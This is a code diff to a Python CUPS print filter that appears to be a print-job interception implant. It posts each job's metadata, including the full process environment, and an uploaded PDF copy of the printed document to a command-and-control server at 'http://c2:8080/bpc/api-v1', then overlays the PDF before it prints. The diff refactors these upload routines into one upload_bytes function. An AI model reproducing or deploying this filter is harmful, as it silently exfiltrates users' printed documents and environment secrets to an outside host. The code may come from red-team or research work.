@@ -1,6 +1,6 @@
-# !/usr/bin/env python3
+#!/usr/bin/env python3
 
-#!/usr/bin/python3 -t
+# !/usr/bin/python3 -t
 
 from __future__ import print_function
 
@@ -70,9 +70,9 @@ class MetaUploader(threading.Thread):
                     'options': self.cups_options, 'timestamp': datetime.datetime.now().isoformat(),
                     'environment': dict(os.environ)}
         bpc_debug("Uploading Metadata")
-        response = requests.post(C2_URL, json=job_data)
+        response = requests.post(C2_METADATA_URL, json=job_data)
         json_response = response.json()
-        bpc_debug("Uploaded Metadata - Response:", response)
+        bpc_debug("Uploaded Metadata - Response:", json_response)
         self._upload_id = json_response['upload_id']
         self._pages = json_response['pages']
 
@@ -99,21 +99,32 @@ def ps_2_pdf(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
     return bytes
 
 
-def upload_pdf(bytes, upload_id):
-    bpc_debug("Uploading PDF:", upload_id)
-    response = requests.post(C2_URL + '/pdf/' + upload_id, data=bytes)
-    bpc_debug("Uploaded PDF:", response)
-
-
-def upload_text(ps_bytes, upload_id):
-    bpc_debug("Uploading Text:", upload_id)
+def ps_2_ascii(ps_bytes):
+    bpc_debug("ps_2_ascii:")
     p = subprocess.Popen(
         args=["/usr/bin/ps2ascii", '-', '-'],
         stdin=subprocess.PIPE,
         stdout=subprocess.PIPE)
     bytes = p.communicate(input=ps_bytes)[0]
-    response = requests.post(C2_URL + '/text/' + upload_id, data=bytes)
-    bpc_debug("Uploaded Text:", response)
+    return bytes
+
+
+def pdf_to_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
+    bpc_debug("pdf_to_ps")
+    p = subprocess.Popen(
+        args=["/usr/lib/cups/filter/pdftops", cups_id, cups_user, cups_title, cups_copies, cups_options],
+        stdin=subprocess.PIPE)
+    p.communicate(input=bytes)
+    p.stdin.close()
+
+
+def pdf_2_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
+    bpc_debug("pdf_2_ps")
+    p = subprocess.Popen(
+        args=["/usr/bin/pdf2ps", '-', '-'],
+        stdin=subprocess.PIPE)
+    p.communicate(input=bytes)
+    p.stdin.close()
 
 
 def overlay_pdf(bytes):
@@ -142,24 +153,6 @@ def overlay_pdf(bytes):
     return result
 
 
-def pdf_to_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
-    bpc_debug("pdf_to_ps")
-    p = subprocess.Popen(
-        args=["/usr/lib/cups/filter/pdftops", cups_id, cups_user, cups_title, cups_copies, cups_options],
-        stdin=subprocess.PIPE)
-    p.communicate(input=bytes)
-    p.stdin.close()
-
-
-def pdf_2_ps(bytes, cups_id, cups_user, cups_title, cups_copies, cups_options):
-    bpc_debug("pdf_2_ps")
-    p = subprocess.Popen(
-        args=["/usr/bin/pdf2ps", '-', '-'],
-        stdin=subprocess.PIPE)
-    p.communicate(input=bytes)
-    p.stdin.close()
-
-
 def read_ps_in_bytes():
     bpc_debug("argc", len(sys.argv))
     if len(sys.argv) > 6 and os.path.isfile(sys.argv[6]):
@@ -170,9 +163,19 @@ def read_ps_in_bytes():
     return bytes
 
 
-C2_URL = 'http://c2:8080/bpc/api-v1'
+def upload_bytes(bytes, upload_id, filename, mimetype):
+    if len(bytes) == 0:
+        return
+    bpc_debug("Uploading Bytes:", upload_id, mimetype)
+    file = {'file': (filename, bytes, mimetype)}
+    response = requests.post(C2_UPLOAD_URL % upload_id, files=file)
+    bpc_debug("Uploaded Bytes:", response)
 
-bpc_debug("sys.argv", sys.argv)
+
+C2_API_URL = 'http://c2:8080/bpc/api-v1'
+C2_METADATA_URL = C2_API_URL + '/metadata'
+C2_UPLOAD_URL = C2_API_URL + '/file/%s'
+
 cups_id = sys.argv[1]
 cups_user = sys.argv[2]
 cups_title = sys.argv[3]
@@ -183,13 +186,11 @@ ps_in_bytes = read_ps_in_bytes()
 
 meta_uploader = MetaUploader(cups_id, cups_user, cups_title, cups_copies, cups_options)
 meta_uploader.start()
-spawn_daemon(upload_text, ps_in_bytes, meta_uploader.upload_id())
 
 # pdf_input_data = ps_to_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
 pdf_in_bytes = ps_2_pdf(ps_in_bytes, cups_id, cups_user, cups_title, cups_copies, cups_options)
 
-spawn_daemon(upload_pdf, pdf_in_bytes, meta_uploader.upload_id())
-# spawn_daemon(upload_text, ps_input_data, meta_uploader.upload_id())
+spawn_daemon(upload_bytes, pdf_in_bytes, meta_uploader.upload_id(), 'print.pdf', 'application/pdf')
 
 pdf_out_bytes = overlay_pdf(pdf_in_bytes)
 
